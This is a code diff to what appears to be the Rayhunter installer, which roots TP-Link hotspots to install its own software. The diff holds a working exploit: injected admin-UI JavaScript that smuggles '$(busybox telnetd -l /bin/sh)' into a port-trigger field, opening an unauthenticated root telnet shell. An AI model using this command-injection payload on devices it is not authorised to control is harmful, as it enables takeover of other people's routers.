@@ -40,6 +40,7 @@ struct V3RootResponse {
 
 pub async fn start_telnet(admin_ip: &str) -> Result<bool, Error> {
     let client = reqwest::Client::new();
+    let addr = SocketAddr::from_str(&format!("{admin_ip}:23")).unwrap();
 
     println!("Launching telnet on the device");
 
@@ -85,11 +86,20 @@ pub async fn start_telnet(admin_ip: &str) -> Result<bool, Error> {
             anyhow::bail!("Bad result code when trying to reset the language: {result}");
         }
 
-        println!("Detected hardware revision v3");
+        // Final check. On v6, all of the above steps succeed, but telnet may still not be launched.
+        sleep(Duration::from_millis(1000)).await;
+        if telnet_send_command(addr, "true", "exit code 0", true)
+            .await
+            .is_err()
+        {
+            continue;
+        }
+
+        println!("Detected hardware revision v3, successfully opened telnet");
         return Ok(true);
     }
 
-    println!("Got a 404 trying to run exploit for hardware revision v3, trying v5 exploit");
+    println!("This doesn't look like a v3 device, trying web-based exploit");
     tplink_launch_telnet_v5(admin_ip).await?;
 
     Ok(false)
@@ -104,7 +114,16 @@ async fn tplink_run_install(
     println!("Connecting via telnet to {admin_ip}");
     let addr = SocketAddr::from_str(&format!("{admin_ip}:23")).unwrap();
 
-    if !skip_sdcard {
+    if skip_sdcard {
+        sdcard_path = "/data/rayhunter-data".to_owned();
+        telnet_send_command(
+            addr,
+            &format!("mkdir -p {sdcard_path}"),
+            "exit code 0",
+            true,
+        )
+        .await?
+    } else {
         if sdcard_path.is_empty() {
             let try_paths = [
                 // TP-Link hardware less than v9.0
@@ -263,9 +282,19 @@ async fn handler(state: State<AppState>, mut req: Request) -> Result<Response, S
         let mut data = BytesMut::from(data);
         // inject some javascript into the admin UI to get us a telnet shell.
         data.extend(br#";window.rayhunterPoll = window.setInterval(() => {
-            Globals.models.PTModel.add({applicationName: "rayhunter-root", enableState: 1, entryId: 1, openPort: "2300-2400", openProtocol: "TCP", triggerPort: "$(busybox telnetd -l /bin/sh)", triggerProtocol: "TCP"});
+            // Intentionally register rayhunter-daemon before rayhunter-root so that we are less
+            // likely to run into race conditions where rayhunter-root is launched, and the
+            // installer kills the server. In practice both HTTP requests may execute concurrently
+            // anyway.
             Globals.models.PTModel.add({applicationName: "rayhunter-daemon", enableState: 1, entryId: 2, openPort: "2400-2500", openProtocol: "TCP", triggerPort: "$(/etc/init.d/rayhunter_daemon start)", triggerProtocol: "TCP"});
-            alert("Success! You can go back to the rayhunter installer.");
+            Globals.models.PTModel.add({applicationName: "rayhunter-root", enableState: 1, entryId: 1, openPort: "2300-2400", openProtocol: "TCP", triggerPort: "$(busybox telnetd -l /bin/sh)", triggerProtocol: "TCP"});
+
+            // Do not use alert(), instead replace page with success message. Using alert() will
+            // block the event loop in such a way that any background promises are blocked from
+            // progress too. For example: The HTTP requests to register our port triggers!
+            document.body.innerHTML = "<h1>Success! You can go back to the rayhunter installer.</h1>";
+
+            // We can stop polling now, presumably both requests are already inflight.
             window.clearInterval(window.rayhunterPoll);
         }, 1000);"#);
         response = Response::from_parts(parts, Body::from(Bytes::from(data)));
@@ -276,6 +305,16 @@ async fn handler(state: State<AppState>, mut req: Request) -> Result<Response, S
 }
 
 async fn tplink_launch_telnet_v5(admin_ip: &str) -> Result<(), Error> {
+    let addr = SocketAddr::from_str(&format!("{admin_ip}:23")).unwrap();
+
+    if telnet_send_command(addr, "true", "exit code 0", true)
+        .await
+        .is_ok()
+    {
+        println!("telnet already appears to be running");
+        return Ok(());
+    }
+
     let client: HttpProxyClient =
         hyper_util::client::legacy::Client::<(), ()>::builder(TokioExecutor::new())
             .build(HttpConnector::new());
@@ -297,14 +336,15 @@ async fn tplink_launch_telnet_v5(admin_ip: &str) -> Result<(), Error> {
 
     let handle = tokio::spawn(async move { axum::serve(listener, app).await });
 
-    let addr = SocketAddr::from_str(&format!("{admin_ip}:23")).unwrap();
-
     while telnet_send_command(addr, "true", "exit code 0", true)
         .await
         .is_err()
     {
         sleep(Duration::from_millis(1000)).await;
     }
+
+    // give the JavaScript code some additional time to run and persist the port triggers.
+    sleep(Duration::from_millis(1000)).await;
 
     handle.abort();
 
